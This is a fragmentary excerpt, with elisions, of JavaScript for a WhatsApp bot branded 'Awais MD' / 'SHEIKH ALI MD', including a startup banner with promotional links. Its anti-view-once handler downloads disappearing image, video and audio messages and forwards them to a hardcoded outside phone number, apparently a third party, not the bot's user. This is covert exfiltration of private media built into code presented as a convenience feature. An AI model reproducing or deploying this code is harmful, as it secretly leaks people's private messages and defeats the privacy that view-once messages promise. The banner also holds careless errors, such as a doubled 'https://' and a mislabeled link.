...
const {
  ...
  let up = `*╭──────────────●●►*\n> *Awais Mᴅ Cᴏɴɴᴇᴄᴛᴇᴅ Sᴜᴄᴄᴇssғᴜʟʏ Tʏᴘᴇ .Mᴇɴᴜ Tᴏ Gᴇᴛ Cᴏᴍᴍᴀɴᴅ Lɪsᴛ Cʀᴇᴀᴛᴇᴅ Bʏ ᴀᴡᴀɪs ᴍᴅ*\n\n> *Jᴏɪɴ Oᴜʀ Wʜᴀᴛsᴀᴘᴘ Cʜᴀɴɴᴇʟ Fᴏʀ Uᴘᴅᴀᴛᴇs Oꜰ Awais Mᴅ*\n\n*https://whatsapp.com/channel/0029Vao1lnR1nozDF8jBNh3B*\n\n> *Fᴏʟʟᴏᴡ Uꜱ Oɴ Iɴꜱᴛᴀɢʀᴀᴍ*\n\n*https://www.tiktok.com/@sheikh_ali_2412?_t=8sZHhyxrT7P&_r=1*\n\n*╭⊱✫ SHEIKH ALI MD ✫⊱╮*\n*│✫➠ - \ud83d\udcc2REPOSITORY NAME:* *SHEIKH-ALI-MD*\n*│✫➠ - \ud83d\udcc3DESCRIPTION:* *PAKISTANI BEST BOT*\n*│✫➠ - \ud83d\udee1️OWNER:* *SHEIKH ALI MD*\n*│✫➠ - \ud83c\udf10URL:* *https://https://github.com/Sheikh-ali-2412/SHEIKH-ALI-MD*\n\n*YOUR BOT ACTIVE NOW ENJOY♥️*\n\n*PREFIX: ${prefix}*\n\n*╰──────────────●●►*`;
  conn.sendMessage(conn.user.id, { image: { url: `https://i.imghippo.com/files/yFpQ9125wYo.jpg` }, caption: up })
  }
  })
  ...
  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
      ...
      let ikratos = mek.message.viewOnceMessageV2
      let ikratos1 = mek.mtype === "viewOnceMessage"
  if (ikratos && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("923470027813@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
    ...
    return conn.sendMessage("923470027813@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
  } if (ikratos.message.audioMessage) {
    let anu = await conn.downloadAndSaveMediaMessage(ikratos.message.audioMessage);
    return conn.sendMessage("923470027813@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
  }
  }
